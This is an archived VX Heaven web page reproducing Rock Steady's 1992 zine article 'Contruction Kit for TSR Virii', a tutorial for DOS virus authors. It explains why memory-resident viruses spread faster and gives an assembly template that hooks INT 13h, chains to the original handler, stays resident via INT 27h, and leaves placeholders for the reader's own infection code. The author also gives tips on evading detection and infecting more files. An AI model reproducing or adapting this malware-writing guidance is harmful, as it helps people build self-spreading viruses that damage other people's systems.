<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> Rock Steady 'Contruction Kit for TSR Virii' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="Rock Steady"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, Rock Steady,Contruction Kit for TSR Virii, resident, files, infect, simple, vector, routines, code, codes, pushf, disk, runs, bios, file, executed, computer"/>
<meta name="Description" content="There are several ways to constructed your viruses. Mainly you have those which are RAM-Resident or better known as a TSR program. And with great thought we have those which are not RAM-Resident.A TSR virus will load into memory and can infect all programs that are executed by the computer. Such like my AmiLiA virus which will infect all EXE and COM files that are ran. Anyhow a TSR virus can certainly spread a lot faster compared to a Non-Resident Virus. Because a NON-Resident Virus will only infect file each time it is ran. Though the NON-Resident will start off very slowly infecting the system files but after the virus is in the system after a number of weeks, it will certainly infect ALL files that are in the system. Where a TSR virus will USUALLY infect files that are executed. So that only files that are often executed will be infected. But The TSR virus can certainly infect A LOT more files than a Non-Resident JUST on the first Hour! It is out numbered 10 to 1. This is the advantage that all programmers enjoy and program TSR viruses. I will explain a SIMPLE method of making your program a TSR one. And it will be as flexible as you want so that NO ONE can stay you `Stole' this information off Rock Steady."/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"9e314e6c01261bac878e035fc9eaa6bc8e45b682-1498755956-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vrs09.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Contruction Kit for TSR Virii</h1><p><a href="/lib/?lang=en&amp;author=Rock%20Steady"> Rock Steady</a><br/> <em><a href="/vx.php?fid=336#f336">Nuke Info Journal [2]</a></em><br/> <em>February 1992</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vrs09.html';</script>[<a style="" href="/lib/?lang=EN&amp;index=DO#vrs09">Back to index</a>] [<a href="/lib/vrs09.html#disqus_thread">Comments</a>]<br/> 
<p>There are several ways to constructed your viruses. Mainly you have those which are RAM-Resident or better known as a TSR program. And with great thought we have those which are not RAM-Resident.</p>
<p>A TSR virus will load into memory and can infect all programs that are executed by the computer. Such like my AmiLiA virus which will infect all EXE and COM files that are ran. Anyhow a TSR virus can certainly spread a lot faster compared to a Non-Resident Virus. Because a NON-Resident Virus will only infect file each time it is ran. Though the NON-Resident will start off very slowly infecting the system files but after the virus is in the system after a number of weeks, it will certainly infect ALL files that are in the system. Where a TSR virus will USUALLY infect files that are executed. So that only files that are often executed will be infected. But The TSR virus can certainly infect A LOT more files than a Non-Resident JUST on the first Hour! It is out numbered 10 to 1. This is the advantage that all programmers enjoy and program TSR viruses. I will explain a SIMPLE method of making your program a TSR one. And it will be as flexible as you want so that NO ONE can stay you `Stole' this information off Rock Steady.</p>
<p>Anyhow I will explain the simple Process of Intercepting ROM-Bios Interrupts and hooking your virus/Program to any Interrupt of your choice. This method that is being explained is also used ALL the Jerusalem Strains. And several of the Vacsina Strains. They total up to close to 100+ Viruses that use this simple way with the TSR Interrupt 27h. Anyhow just because I'm explaining this method your virus CANNOT be detected because of this TSR routines because there are routines I DEVELOPED ALONE and will soon to be release in one of my future virii. Anyhow there are an UNLIMITED amount of ways to make TSRs so that along as you Develop YOUR OWN routine it will NEVER get detected as a virus for all you Beginners. And how this routine can be used in several OTHER utilities not just viruses.</p>
<h2>Beginning...</h2>
<p>First we must Intercept an Interrupt, Lets say we want our virus to activate Every TIME the disk I/O is being used we would use INT 13h or INT 21h. The INT 13h will activate everytime ANY file is opened or Closed And the INT 21h will activity anytime any file is executed or any INT 21h functions Like a "DIR" in DOS. If you want you can even hooked your virus to INT 10h and it may activate when Graphics are displayed, or you can hook it to the interrupt involved with Printer Functions. Whatever seems to `EnLighten' you, since we live in a Distressed world, I won't even bother why we shouldn't hooked them up to just ANY interrupt.</p>
<p>Anyhow, interrupts use a vector table at the bottom of memory (ROM) to find out what routine in the ROM Bios to call. So the address for Interrupt 21h would be located at 0000:0084 and for Interrupt 13h it would be found at 0000:004Ch. So we can change theses addresses in the vector table. What we do is we change the vector address to POINT to our virus. So everytime the Interrupt is called it goes to the vector table and the table tells it to call our Virus, rather than calling the ROM Bios. But what MUST do FIRST is save the ORIGINAL Interrupt routine and place that somewhere in memory. So that our virus will call the Original ROM Bios routine after executing itself.</p>
<p>Lets say we hooked our Virus to the INT 13h, which controls all Disk Activities. So if our Computer users tries to read something from the disk the Computer will call the INT 13h bios Routines on How To do it. But instead of finding the INT 13h routines it calls our virus, and the Virus gets ran, which then our virus does what it has to do, and then runs the Original INT 13h Routine where-ever it was stored. So it simulates an INT call to the ROM bios routines.</p>
<pre class="source">
 ;----------------------------------------------------------------
 ; Sample Program on how to Hook your virus to an Interrupt call.
 ;----------------------------------------------------------------
 Code        Segment
         Assume  cs:code,ss:code,ds:code,es:code
         Org     100h       ; Guess this will be a COM file? Huh?


 Begin:  JMP     Bios_Routine

         NOP                  ; This is just a cheap .COM file that the
         NOP                  ; virus is attached to. Remember you should
         NOP                  ; have the first 3 bytes written in your
         INT     20h          ; virus.

 OLD_ROM_INT     DD      ?    ;Our Stack to save the OLD Int Address

 ;----------------------------------------------------------------
 ; This Calls the VIRUS and then the simulates the OLD Rom Routine
 ;----------------------------------------------------------------
 Virus_Codes    PROC     FAR
        Assume  cs:code, ds:nothing

        pushf               ; Everytime the ROM-Routine is call this
        push    ax          ; is what happens... Saves the Regesters
        push    di          ; And runs Our Virus... Then it restores
        push    si          ; the regesters and Runs the OLD_ROM Bios
        push    es          ; Routine that was supposed to be ran in
        push    ds          ; the first place...
        call    The_Virus
        pop     ds          ;NoTe: It's better to SAVE all Regesters and
        pop     es          ; Flags because our Virus WILL ALTER a few
        pop     si          ; And when the Virus leaves control back to the
        pop     di          ; Computer it is EXPECTED to continue where it
        pop     ax          ; It left off...
        popf

        pushf            ; This `pushf' is NEEDED to act like a simulated
        call    OLD_ROM_INT       ; ROM Bios Interrupt call...

        ret
 Virus_Codes   ENDP

 ;----------------------------------------------------------------
 ; Put the REAL Virus Codes here...
 ;----------------------------------------------------------------
 The_Virus        PROC    NEAR
        ...            ; Put your OWN Virus codes here...
        ...            ; Just make it compatible with our
        ...            ; Codes... Try to make it small and
        ...            ; it will take up less space in the
        ...            ; users' memory.
        ...
        ...            ;NoTe: Try to infect files that are ONLY
        ...            ; Executed! Rather than each time the INT
        ...            ; is used... Get it?
        RET
 The_Virus      ENDP

 ;---------------------------------------------------------------
 ; This is the Procedure that SAVE the OLD_ROM Bios in our Virus
 ; And places a Call to point to our Virus. Which then Calls the
 ; OLD_ROM Bios Routine. So Remember to SAVE it first.
 ;---------------------------------------------------------------
 Bios_Routine   PROC    NEAR
        Assume  cs:code,ds:code

        mov     ah,35h      ; This Asks for the interrupt vector!
        mov     al,13h      ; whatever is in AL is what int vector
        int     21h         ; address you get and is stored in ES:BX

        mov     word ptr OLD_ROM_INT,bx   ;Save the BX register in our Stack
        mov     word ptr OLD_ROM_INT[2],es ;And same to the ES Register

 ; Here you SHOULD put a small routine to check if the Interrupt vector has
 ; already been changed! For INT 13h this should contain 0000:004Ch the
 ; formula for this is (Interrupt # times 4) For INT 21h it is (21hx4)=84h
 ; and so on. So if its been changed it means the virus has already changed
 ; it! And it `Should' be resident. How ever this is a simple way of doing
 ; it. but not always the BEST way... Because any program the hooks to the
 ; virus interrupt will fool the virus to think it is already resident.
 ; Though this source is NOT for the Professional Virus Programmer like myself
 ; because WE KNOW! But for those that are half way there...

        mov     ah,25h    ; This asks to set a Interrupt vector address!
        mov     al,13h    ; Interrupt # to be set goes in AL
        mov     dx,offset Virus_Codes ; Sets INT 13h to point to `Virus Code'
        int     21h

        mov     dx,offset Bios_Routine
        int     27h
 Bios_Routine     ENDP

 ;  Anything after this point will not be memory resident. because the end
 ;  of the resident portion ends at `Bios_Routine' procedure.

 Code        ENDS
      END    Begin
 ;----------------------------- EnD ----------------------------------
</pre>
<p>Simple isn't it? Anyhow I tried to make this as simple as possible. I hope I didn't lose you. Anyhow this is a simple routine that several TSR virii use. Anyhow, see what that gives you....</p>
[<a style="" href="/lib/?lang=EN&amp;index=DO#vrs09">Back to index</a>] [<a href="/lib/vrs09.html#disqus_thread">Comments</a>]<br/> <div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
<div style="display: none;"><a href="/lib/index.php?lang=de&amp;id=vrs09">de</a><a href="/lib/index.php?lang=en&amp;id=vrs09">en</a><a href="/lib/index.php?lang=es&amp;id=vrs09">es</a><a href="/lib/index.php?lang=it&amp;id=vrs09">it</a><a href="/lib/index.php?lang=fr&amp;id=vrs09">fr</a><a href="/lib/index.php?lang=pl&amp;id=vrs09">pl</a><a href="/lib/index.php?lang=ru&amp;id=vrs09">ru</a><a href="/lib/index.php?lang=ua&amp;id=vrs09">ua</a></div>
</body>
</html>
